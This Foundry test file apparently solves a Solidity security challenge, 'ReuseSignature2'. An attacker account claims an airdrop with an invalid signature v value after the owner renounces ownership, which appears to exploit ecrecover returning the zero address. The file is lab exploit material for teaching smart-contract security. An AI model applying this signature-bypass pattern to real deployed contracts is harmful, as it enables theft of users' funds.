// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";
import {ReuseSignature2} from "@main/2_ReuseSignature2.sol";

contract ReuseSignature2Test is Test {

    string mnemonic = "test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    uint256 attackerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 2); //  address = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC

    address deployer = vm.addr(deployerPrivateKey);
    address attacker = vm.addr(attackerPrivateKey);

    ReuseSignature2 reuseSignature;

    function setUp() public {
        vm.startPrank(deployer);

        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");
       
        reuseSignature = new ReuseSignature2();
        vm.stopPrank();
    }

    function testFork_isSolved() public {
        vm.startPrank(attacker);

        // use any signature combination
        // cd scripts_python
        // poetry run python scripts_python/2_craftMessageAndSig.py
        uint256 amount = 1 ether;
        address to = attacker;
        uint8 v = 27;
        bytes32 r = hex"9dfe09dd6ba6e41dd95ef195e8825d68725dda4ff8c38509189388a5e217a20e";
        bytes32 s = hex"0fac5df22b0170276cf9b4b6a3edff182dabee4558f792a96606b2dd378098de";

        vm.expectRevert(bytes("invalid signature"));
        reuseSignature.claimAirdrop(amount, to, v, r, s);


        vm.stopPrank();

        vm.prank(deployer);
        reuseSignature.renounceOwnership();

        vm.startPrank(attacker);
        // random number nither than 27 or 29
        v = 10;
        reuseSignature.claimAirdrop(amount, to, v, r, s);
        vm.stopPrank();
    }

}